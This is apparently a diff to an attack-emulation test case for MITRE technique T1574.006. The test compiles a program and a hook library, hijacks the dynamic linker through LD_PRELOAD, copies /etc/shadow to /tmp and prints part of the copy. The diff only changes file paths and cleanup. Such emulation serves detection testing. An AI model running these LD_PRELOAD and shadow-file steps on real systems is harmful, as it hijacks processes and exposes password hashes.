@@ -1,15 +1,15 @@
 Elevation Required;
 #pre
-gcc -o /home/ubuntu/attack/target_program /home/ubuntu/attack/target_program.c
-gcc -shared -fPIC -o /home/ubuntu/attack/myhook.so /home/ubuntu/attack/myhook.c
+gcc -o /tmp/target_program /tmp/target_program.c
+gcc -shared -fPIC -o /tmp/myhook.so /tmp/myhook.c
 #check
 echo "执行target_program程序："
-/home/ubuntu/attack/target_program
+/tmp/target_program
 echo "利用LD_PRELOAD劫持动态链接器，执行cp /etc/shadow /tmp/T1574.006命令"
-export LD_PRELOAD=/home/ubuntu/attack/myhook.so
+export LD_PRELOAD=/tmp/myhook.so
 echo "再次执行target_program程序："
-/home/ubuntu/attack/target_program
+/tmp/target_program
 echo "查看/tmp/T1574.006文件部分内容："
 if [ -e "/tmp/T1574.006" ]; then cat /tmp/T1574.006 | head -n 5; else echo "No such file or directory"; fi
 #cleanup
-rm /home/ubuntu/attack/target_program /home/ubuntu/attack/myhook.so /tmp/T1574.006
+rm /tmp/target_program /tmp/myhook.so /tmp/myhook.c /tmp/target_program.c /tmp/T1574.006
